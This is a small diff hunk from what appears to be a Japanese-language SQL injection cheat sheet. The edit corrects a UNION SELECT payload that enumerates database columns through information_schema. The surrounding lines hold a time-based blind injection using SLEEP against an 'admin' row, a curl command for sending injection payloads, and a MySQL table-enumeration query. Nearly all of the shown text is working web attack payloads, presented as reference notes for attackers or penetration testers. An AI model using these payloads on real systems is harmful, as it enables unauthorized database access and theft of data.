@@ -42,7 +42,7 @@ UNION SELECT SLEEP(5),2 from テーブル名 where カラム名='admin' and カ�
 curl <url> -d "<sql>;-- -" #コマンドラインからcurlでもできる
 
 //テーブル名：カラムの名前とテーブル名をセットで列挙
-UNION SELECT column_name, table_name, null information_schema.columns;-- -
+UNION SELECT column_name, table_name, null from information_schema.columns;-- -
 
 //テーブル情報の列挙
 UNION SELECT null,null,table_name FROM information_schema.tables;-- - #mysqlの場合
